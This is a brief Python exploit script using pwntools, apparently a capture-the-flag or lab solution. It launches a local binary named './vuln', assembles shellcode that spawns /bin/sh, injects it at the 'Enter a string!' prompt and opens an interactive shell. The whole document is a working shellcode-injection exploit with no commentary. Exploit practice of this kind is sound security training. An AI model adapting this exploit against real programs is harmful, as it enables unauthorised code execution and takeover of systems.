#!/usr/bin/env python

from pwn import *

context.update(arch='i386', os='linux')

r = process("./vuln")

shellcode = shellcraft.sh()
print(repr(asm(shellcode)))
r.recvuntil("Enter a string!\n")
r.sendline(asm(shellcode))

r.interactive()
